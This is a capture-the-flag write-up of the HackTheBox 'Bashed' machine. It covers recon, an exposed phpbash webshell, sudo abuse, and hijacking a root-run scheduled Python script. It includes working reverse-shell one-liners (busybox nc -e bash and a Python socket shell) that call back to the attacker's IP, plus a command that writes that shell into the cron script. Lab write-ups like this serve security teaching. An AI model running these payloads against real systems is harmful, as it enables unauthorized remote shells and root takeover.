---
render_with_liquid: false
title: HackTheBox Writeup  Bashed
date: 2023-09-29 18:08:01 +1400
tags: [hackthebox, nmap, linux, feroxbuster, discover-webshell, sudo, scheduled-job-abuse, python-script, pwncat, oscp-like]
---




# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bashed]
└─$ writehosts htb '10.129.68.38 bashed.htb'
+---------+--------+--------------+------------+
| PROFILE | STATUS |      IP      |   DOMAIN   |
+---------+--------+--------------+------------+
| htb     | on     | 10.129.68.38 | bashed.htb |
+---------+--------+--------------+------------+
```


## Nmap

```bash

# Nmap 7.94 scan initiated Fri Sep 29 18:07:49 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80 bashed.htb
Nmap scan report for bashed.htb (10.129.1.104)
Host is up, received user-set (0.056s latency).
Scanned at 2023-09-29 18:08:01 CST for 11s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Sep 29 18:08:12 2023 -- 1 IP address (1 host up) scanned in 22.74 seconds
```


## 80 - HTTP : Arrexel's Development Site


### Info

![](/assets/obsidian/ba9bf479e3316dcab03707ecb683a0e6.png)

### Directory

```bash
feroxbuster -k -t 150 -u 'http://bashed.htb' -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bashed]
└─$ cat ferox_80.txt|awk '$1!=404'|grep -vE 'bashed.htb/js/|bashed.htb/fonts/|bashed.htb/images/|bashed.htb/css/'
MSG      0.000 feroxbuster::heuristics detected directory listing: http://bashed.htb/fonts (Apache)
301      GET        9l       28w      310c http://bashed.htb/uploads => http://bashed.htb/uploads/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://bashed.htb/js (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://bashed.htb/images (Apache)
301      GET        9l       28w      306c http://bashed.htb/php => http://bashed.htb/php/
301      GET        9l       28w      306c http://bashed.htb/dev => http://bashed.htb/dev/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://bashed.htb/php (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://bashed.htb/dev (Apache)
200      GET        0l        0w        0c http://bashed.htb/php/sendMail.php
200      GET      216l      489w     8151c http://bashed.htb/dev/phpbash.php
200      GET        1l      255w     4559c http://bashed.htb/dev/phpbash.min.php
200      GET      161l      397w     7743c http://bashed.htb/
```


### Sub Domains


# User Flag
---


# Root Flag
---

## Start pwncat-cs listener

I'm decided to play with [pwncat](https://github.com/calebstewart/pwncat) this time, haven't used it for a while.

Found it useful as a light weight C2 while playing **hackthebox battlegrounds** recently

Its main functions are : `Multi sessions`, `Upload/Download command`, `Auto spawn tty (Sets stty row,columns and TERM env value)`

> I'm a fan of **tmux**, and it allows me to automate some workflows like the one liner below
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bashed]
└─$ tmux send-keys 'listen -m linux 1111' ENTER & pwncat-cs
```

The interface is beautiful

![](/assets/obsidian/c0c68a707f63a62573cac87a4cfd439e.png)

## Shell as www-data


### phpbash webshell exposure

Click on the `phpbash` article, it reveals an open source project it's using

![](/assets/obsidian/b09effa110f54147212a4ef3e6ecdaf9.png)

> [https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)

It's a webshell with no password authentication feature

Visit http://bashed.htb/dev/phpbash.php which was discovered by **feroxbuster**

![](/assets/obsidian/fadab37b2487dfbe90feec7e2ade6573.png)

Now get a reverse shell

> **Revshell cheat sheet**
> Another amazing tool I discovered during htb battlegrounds
> > https://github.com/H0j3n/EzpzShell
{: .prompt-tip }

Tried some `bash`, `python3` and `netcat` reverse shells, none of them worked

These worked:

```bash

# (Trick) Solve nc version issue : use the nc from busybox
busybox nc 10.10.16.13 1111 -e bash


# Python2 revshell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.13",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

> Press `CTRL + D` to detach/attach session in pwncat
{: .prompt-info }

![](/assets/obsidian/42de5647440f920bd5db7ebaef0583b9.png)

## From www-data to scriptmanager


### SUDO

```bash
(remote) www-data@bashed:/var/www/html/dev$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

```bash
(remote) www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager bash
scriptmanager@bashed:/var/www/html/dev$ id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

```bash
scriptmanager@bashed:/var/www/html/dev$ cat ~/user.txt
cat: /home/scriptmanager/user.txt: No such file or directory
scriptmanager@bashed:/var/www/html/dev$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
```


## From scriptmanager to root


### Schedule Job - Improper permission set on script

Find what the user owns

```bash
find / \( -path /run -o -path /sys -o -path /proc -o -path /var/lib \) -prune -o -user $USER -ls 2>/dev/null
```

![](/assets/obsidian/297a073bd8f1f80d75b401545b808932.png)

I guessed the `/script/test.py` will be run as root (too lazy to start **pspy** XD) since the owner of `test.txt` (Created by the python script) was root

Replace the script with reverse shell

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.13",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /scripts/test.py
```

Got a shell as root within about 30 secods

![](/assets/obsidian/4b4676da9a501843a21ba729e5d6c1a6.png)

```bash
(remote) root@bashed:/scripts#
(remote) root@bashed:/scripts# cd /root
(remote) root@bashed:/root# ls -la
total 28
drwx------  3 root root 4096 Sep 29 02:58 .
drwxr-xr-x 23 root root 4096 Jun  2  2022 ..
lrwxrwxrwx  1 root root    9 Jun  2  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3121 Dec  4  2017 .bashrc
drwxr-xr-x  2 root root 4096 Jun  2  2022 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Sep 29 02:58 root.txt
-rw-r--r--  1 root root   66 Dec  4  2017 .selected_editor
(remote) root@bashed:/root# cat root.txt
29eb4fe26e76d309de80c49c5c5f2649
(remote) root@bashed:/root# cat /home/
arrexel/       scriptmanager/
(remote) root@bashed:/root# cat /home/arrexel/user.txt
676ef72038a146124670c90693c7c5f9
(remote) root@bashed:/root#
```


# Additional
---
